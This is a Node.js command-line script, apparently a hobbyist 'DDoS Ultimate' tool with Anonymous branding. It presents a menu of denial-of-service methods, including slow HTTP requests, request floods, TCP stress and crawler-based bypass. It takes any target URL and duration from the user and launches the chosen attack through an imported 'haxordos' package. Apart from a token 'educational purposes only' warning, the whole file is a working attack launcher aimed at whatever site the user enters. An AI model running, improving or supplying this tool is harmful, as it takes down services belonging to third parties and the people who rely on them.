const hacxorDos = require('haxordos'); 
const gradient = require('gradient-string');

// ANSI Colors
const yellow = '\x1b[33m';
const red = '\x1b[31m';
const green = '\x1b[32m';
const cyan = '\x1b[36m';
const magenta = '\x1b[35m';
const white = '\x1b[37m';
const reset = '\x1b[0m';

function showTitle() {
    process.stdout.write('\x1Bc'); // Clear screen
    
    // Logo Anonymous (Guy Fawkes Mask)
    const logo = `
               .-=""""=-.
             .'           '.
            /               \\
           |   .-.     .-.   |
           |  (   )   (   )  |
           |   '-'     '-'   |
           |        _        |
           |       / \\       |
           |      /   \\      |
           |     /     \\     |
            \\   /       \\   /
             '.'-.___.-' '
               '-....-'
    `;
    
    console.log(gradient.passion(logo));
    console.log(cyan + '╔══════════════════════════════════════════════════╗');
    console.log(cyan + '║' + magenta + '         [ C332y // DDoS Ultimate v3.0 ]         ' + cyan + '║');
    console.log(cyan + '║' + white + '          "We Are Legion. We Do Not Forgive."      ' + cyan + '║');
    console.log(cyan + '╚══════════════════════════════════════════════════╝\n' + reset);
}

function typeText(text, delay = 30) {
    return new Promise((resolve) => {
        let i = 0;
        const typeInterval = setInterval(() => {
            process.stdout.write(text[i]);
            i++;
            if (i >= text.length) {
                clearInterval(typeInterval);
                console.log();
                resolve();
            }
        }, delay);
    });
}

async function showMenuOptions() {
    const menuOptions = [
        `${yellow} [${red}1${yellow}]${reset}${green} SlowRiss      ${white}- Slow HTTP Request Attack${reset}`,
        `${yellow} [${red}2${yellow}]${reset}${green} CrawlDos      ${white}- Crawler Based Bypass${reset}`,
        `${yellow} [${red}3${yellow}]${reset}${green} fastDuck      ${white}- Rapid Request Flood${reset}`,
        `${yellow} [${red}4${yellow}]${reset}${green} netTcp        ${white}- TCP Layer Stress${reset}`,
        `${yellow} [${red}5${yellow}]${reset}${green} httpEndpoint  ${white}- Endpoint Targeting${reset}`
    ];

    console.log(magenta + ' ┌──[ AVAILABLE METHODS ]─────────────────────────┐' + reset);
    for (const option of menuOptions) {
        await typeText(' ' + option, 20); // Lebih cepet dikit
        await new Promise(resolve => setTimeout(resolve, 50));
    }
    console.log(magenta + ' └────────────────────────────────────────────────┘\n' + reset);
}

function executeAttack(methodNum, url, time) {
    const duration = parseInt(time);
    console.log(cyan + `\n [*] Initializing ${getMethodName(methodNum)} protocol...` + reset);
    console.log(green + ` 🚀 Starting attack on ${url} for ${time} seconds...\n` + reset);

    try {
        switch(methodNum) {
            case 1: hacxorDos.SlowRiss(url, duration); break;
            case 2: hacxorDos.CrawlDos(url, duration); break;
            case 3: hacxorDos.fastDuck(url, duration); break;
            case 4: hacxorDos.netTcp(url, duration); break;
            case 5: hacxorDos.httpEndpoint(url, duration); break;
            default: console.log(red + ' [-] Invalid method selected!' + reset); return;
        }

        let secondsElapsed = 0;
        const progressInterval = setInterval(() => {
            secondsElapsed++;
            const progress = (secondsElapsed / duration) * 100;
            
            // Bikin progress bar visual yang keren
            const barLength = 20;
            const filledLength = Math.round((secondsElapsed / duration) * barLength);
            const bar = '█'.repeat(filledLength) + '-'.repeat(barLength - filledLength);
            
            process.stdout.write(`\r ${cyan}[${bar}] ${progress.toFixed(1)}% ${yellow}(${secondsElapsed}s/${time}s)${reset}  `);
            
            if (secondsElapsed >= duration) {
                clearInterval(progressInterval);
                console.log(`\n\n ${green}[+] Attack completed successfully!${reset}\n`);
            }
        }, 1000);
    } catch (error) {
        console.log(red + `\n [-] Error executing attack: ${error.message}` + reset);
    }
}

const readline = require('readline');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

async function showMenu() {
    await showMenuOptions();
    
    rl.question(cyan + ' [?] Select Methods <1-5> : ' + reset, (method) => {
        const methodNum = parseInt(method);
        if (methodNum >= 1 && methodNum <= 5) {
            rl.question(cyan + ' [?] Target URL          : ' + reset, (url) => {
                if (!url.startsWith('http://') && !url.startsWith('https://')) {
                    url = 'http://' + url;
                }
                rl.question(cyan + ' [?] Time (seconds)      : ' + reset, (time) => {
                    const timeNum = parseInt(time);
                    if (isNaN(timeNum) || timeNum <= 0) {
                        console.log(red + ' [-] Invalid time! Please enter a positive number.' + reset);
                        rl.close();
                        return;
                    }
                    
                    console.log(gradient.morning(`
╔══════════════════════════════════════════════════╗
║                 ATTACK INITIATED                 ║
╚══════════════════════════════════════════════════╝
`));
                    console.log(white + ` TARGET    : ${green}${url}${reset}`);
                    console.log(white + ` TIME      : ${green}${time} seconds${reset}`);
                    console.log(white + ` METHOD    : ${green}${getMethodName(methodNum)}${reset}`);
                    console.log(white + ` TIMESTAMP : ${green}${new Date().toLocaleString()}${reset}`);
                    console.log(red + '\n ⚠️  WARNING: This tool is for educational purposes only!' + reset);
                    console.log(red + '    Use responsibly and legally!\n' + reset);
                    
                    executeAttack(methodNum, url, timeNum);
                    
                    // Tunggu sampe attack selesai baru close readline
                    setTimeout(() => {
                        rl.close();
                    }, (timeNum + 2) * 1000); 
                });
            });
        } else {
            console.log(red + ' [-] Invalid choice! Please select between 1-5!' + reset);
            showMenu();
        }
    });
}

function getMethodName(methodNum) {
    const methods = { 1: 'SlowRiss', 2: 'CrawlDos', 3: 'fastDuck', 4: 'netTcp', 5: 'httpEndpoint' };
    return methods[methodNum] || 'Unknown';
}

// Start
showTitle();
showMenu();
